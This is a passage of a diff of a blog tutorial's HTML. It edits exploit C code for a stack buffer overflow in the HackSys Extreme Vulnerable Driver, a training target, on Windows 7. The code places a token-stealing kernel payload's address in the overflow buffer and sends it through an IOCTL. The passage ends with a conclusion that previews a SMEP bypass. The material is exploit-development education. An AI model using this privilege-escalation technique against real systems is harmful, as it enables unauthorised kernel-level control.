-</span></span><span style="display:flex;"><span>    lpInBuffer[inBufferSize <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> (lpShellcode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x00FF0000</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x10</span>;
-</span></span><span style="display:flex;"><span>    lpInBuffer[inBufferSize <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> (lpShellcode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF000000</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x18</span>;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    lpInBuffer[(inBufferSize <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> (DWORD)<span style="color:#f92672">&amp;</span>TokenStealingPayloadWin7Generic;
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Sending buffer with IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HEVD_IOCTL_BUFFER_OVERFLOW);
 </span></span><span style="display:flex;"><span>    
@@ -871,17 +853,15 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>        HEVD_IOCTL_BUFFER_OVERFLOW,
 </span></span><span style="display:flex;"><span>        lpInBuffer,
 </span></span><span style="display:flex;"><span>        inBufferSize,
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nullptr</span>,
+</span></span><span style="display:flex;"><span>        NULL,
 </span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>bytesReturned,
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nullptr</span>
+</span></span><span style="display:flex;"><span>        NULL
 </span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>result) {
 </span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[-] Failed to send IOCTL to HEVD Driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] IOCTL sent successfully to HEVD driver!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Freeing input buffer...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
@@ -924,7 +904,8 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>        ret <span style="color:#ae81ff">8</span>                               ; Return the expected value
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>When writing exploit code it is even more difficult than normal to document what your code is doing, since the program being exploited isn&rsquo;t included in the source.  As such, it is even more important than normal to include proper comments and explanations for everything non-obvious that the code is doing.</p>
+</span></span></code></pre></div><p>This can also be found on Github <a href="https://github.com/stolenfootball/HEVDExploits/blob/main/BufferOverflowStack/Windows7x32/exploit.c" target="_blank">here</a>.</p>
+<p>When writing exploit code it is even more difficult than normal to document what your code is doing, since the program being exploited isn&rsquo;t included in the source.  As such, it is even more important than normal to include proper comments and explanations for everything non-obvious that the code is doing.</p>
 <h2 id="conclusion">Conclusion</h2>
 <p>That was a big post with a lot of information, but it is probably the most important post in this series.  If you&rsquo;re following along, make sure you understand everything in here before moving on.  Next I&rsquo;ll be discussing how to get this same exploit working on Windows 8.1 with a SMEP bypass.</p>
 <h2 id="more-reading">More reading</h2>
